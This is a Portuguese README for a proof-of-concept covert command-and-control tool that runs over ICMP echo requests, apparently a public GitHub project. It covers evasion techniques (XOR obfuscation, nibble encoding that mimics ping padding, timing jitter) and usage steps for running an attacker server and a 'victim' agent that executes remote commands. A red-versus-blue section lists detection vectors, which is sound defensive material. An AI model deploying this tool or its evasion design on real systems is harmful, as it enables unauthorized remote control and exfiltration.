
````markdown
# FEP ICMP Stealth C2 (PoC)

> **Aviso Legal:** Este software foi desenvolvido apenas para fins educacionais e de pesquisa em cibersegurança. O uso deste código em redes ou sistemas sem autorização explícita é ilegal e antiético. O autor não se responsabiliza por mau uso.

## Sobre o Projeto

O **FEP ICMP Stealth C2** é uma Prova de Conceito (PoC) de um canal de Comando e Controle (C2) encoberto que opera exclusivamente sobre o protocolo **ICMP** (Ping).

Diferente de C2s tradicionais que utilizam TCP/UDP (HTTP, DNS), este projeto utiliza **Raw Sockets** para manipular pacotes `Echo Request` e transportar payloads arbitrários, contornando firewalls que bloqueiam portas padrão mas permitem tráfego de diagnóstico de rede.

O projeto implementa múltiplas camadas de ofuscação para evadir sistemas de deteção (IDS/IPS) básicos, incluindo criptografia XOR, *Nibble Encoding* para simular payloads legítimos e *Jitter* temporal.

O repositório inclui implementações em **Python** (Moderna) e **Perl** (Legacy/Nativa) para garantir versatilidade em diferentes ambientes.

-----

## Funcionalidades Principais

* **Protocolo Connectionless:** Comunicação via ICMP Type 8 (Echo Request), sem necessidade de handshake TCP.
* **Criptografia Leve:** Ofuscação de payload via **XOR** para evitar deteção de strings (DLP).
* **Camuflagem "Camaleão":** Implementa **Nibble Encoding**, convertendo dados binários em caracteres ASCII (`a-p`). Isso reduz a entropia visual e mimetiza o padrão de preenchimento de pings padrão do Windows/Linux.
* **Evasão Comportamental (Jitter):** Introduz atrasos aleatórios (`3.0s` a `10.0s`) entre heartbeats para evitar deteção por análise de frequência fixa.
* **Arquitetura Assíncrona:** O servidor utiliza multithreading para escutar a rede e aceitar input do operador simultaneamente.

-----

## Instalação e Requisitos

### Pré-requisitos

* **Sistema Operacional:** Linux (Recomendado) ou Windows.
* **Linguagens:**
    * **Python:** Versão 3.6 ou superior.
    * **Perl:** Versão 5+ (Geralmente nativo na maioria das distros Linux).
* **Privilégios:** É necessário acesso **Root/Sudo** (Linux) ou **Administrador** (Windows) devido à utilização de `SOCK_RAW`.

### Clonar o Repositório

```bash
git clone [https://github.com/felipeandrian/fep-icmp-stealth-c2.git](https://github.com/felipeandrian/fep-icmp-stealth-c2.git)
cd fep-icmp-stealth-c2
````

-----

## Guia de Uso (Python)

### 1\. Iniciar o Servidor (C2)

O servidor deve ser iniciado primeiro. Ele ficará à escuta de "Heartbeats" dos agentes.

```bash
sudo python3 servidor_c2.py
```

*Interface:*

```text
 C2 FURTIVO ONLINE (Camaleão ativado)
C2> 
```

### 2\. Iniciar o Agente (Vítima)

No computador alvo, edite a variável `HACKER_IP` no script e execute:

```bash
sudo python3 cliente_c2.py
```

### 3\. Executar Comandos

No terminal do servidor, digite o comando desejado. O comando será enfileirado e enviado assim que o agente enviar o próximo Heartbeat.

```text
C2> ls -la
 Aguardando Heartbeat...
[+] Comando enviado para 192.168.1.X!

RESULTADO DE 192.168.1.X:
total 40
drwxr-xr-x 2 user user 4096 ...
```

-----

## Versão Perl (Legacy/Native Support)

O projeto inclui uma implementação completa em **Perl** para ambientes onde Python não está disponível ou onde se deseja utilizar binários nativos do sistema (*Living off the Land*).

**Funcionalidades:** Mesma paridade com a versão Python (XOR, Encoding, Jitter).

### Uso (Perl)

```bash
# Lado do Servidor (Atacante)
sudo perl servidor.pl

# Lado do Agente (Vítima)
# Edite a variável $HACKER_IP dentro do script antes de rodar
sudo perl agente.pl
```

-----

## 🛡️ Análise de Segurança (Red vs Blue Team)

Esta secção detalha as capacidades de evasão e os vetores de deteção da ferramenta.

### 🟢 O que Escapa à Deteção (Evasão)

1.  **Firewalls de Camada 4 (Bloqueio de Portas):**
      * Como o ICMP opera na Camada 3 (Rede), ele não utiliza portas (como 80 ou 443). Firewalls configurados para bloquear portas de saída desconhecidas ignorarão este tráfego, assumindo que são diagnósticos de rede permitidos.
2.  **Inspeção de Conteúdo (DLP Básico):**
      * A criptografia XOR destroi assinaturas de texto claro. Palavras-chave como `password`, `shadow` ou `cmd.exe` não são visíveis no payload.
3.  **Filtros de Entropia Binária:**
      * Muitos IDS bloqueiam pacotes ICMP contendo dados binários aleatórios. O **Nibble Encoding** transforma o payload em texto ASCII (`abcdef...`), baixando a entropia aparente e fazendo o pacote parecer inofensivo.
4.  **Rate Limiting Simples:**
      * O uso de **Jitter** (atrasos aleatórios) impede que o tráfego seja classificado como um ataque de negação de serviço (DoS) ou um bot com temporizador fixo.

### 🔴 O que é Detectado (Vetores de Defesa)

1.  **Análise de Frequência de Caracteres (Estatística):**
      * Embora o payload pareça texto (`abkdjf...`), a distribuição das letras é uniforme (devido ao XOR). Padrões legítimos de ping (ex: Windows) seguem uma sequência alfabética estrita (`abcde...`). Uma análise estatística revelará a anomalia.
2.  **Análise de Volume (Flow Analysis):**
      * O *Nibble Encoding* dobra o tamanho dos dados (1 byte real = 2 bytes na rede). Exfiltrar grandes volumes de dados gerará pacotes ICMP anormalmente grandes ("Jumbo Frames") ou um volume de tráfego incompatível com diagnósticos simples.
3.  **Behavioral Analytics (UEBA/Beaconing):**
      * Mesmo com Jitter, a comunicação contínua e prolongada entre um host interno e um IP público único (sem rotação de infraestrutura) será classificada como comportamento de *Beaconing* por SIEMs avançados.
4.  **Fingerprinting de Protocolo:**
      * O cabeçalho ICMP é construído manualmente via `struct` (Python) ou `pack` (Perl). Pequenas discrepâncias nos campos de cabeçalho (Checksum, Sequence Number, TTL) comparadas com a implementação nativa do SO podem ser detectadas por ferramentas de *Passive OS Fingerprinting*.

> **Obs:** Uma versão real (weaponized) utilizaria rotação de IPs, payloads DNS e imitação de cabeçalhos OS-specific para evitar estas detecções.

-----

## 📂 Estrutura do Código

### Python (Implementação Principal)

  * **`cliente_c2.py`**: Script do lado da vítima.
      * Implementa loop infinito de *Beaconing*.
      * Executa comandos via `subprocess`.
      * Aplica Jitter (`random.uniform`).
  * **`servidor_c2.py`**: Script do lado do atacante.
      * Utiliza `threading` para separar a escuta de rede (Listener) da interface de usuário (Input).
      * Mantém estado dos comandos pendentes.

### Perl (Implementação Alternativa)

  * **`agente.pl`**: Versão do cliente em Perl. Ideal para servidores Linux sem Python 3 instalado.
  * **`servidor.pl`**: Versão do servidor em Perl utilizando `threads`.

-----

## 🤝 Como Contribuir

1.  Faça um Fork do projeto.
2.  Crie uma Branch para sua Feature (`git checkout -b feature/NovaFeature`).
3.  Faça o Commit (`git commit -m 'Adicionando nova feature'`).
4.  Faça o Push (`git push origin feature/NovaFeature`).
5.  Abra um Pull Request.

-----

## 📄 Licença

Distribuído sob a licença MIT. Veja `LICENSE` para mais informações.

```
```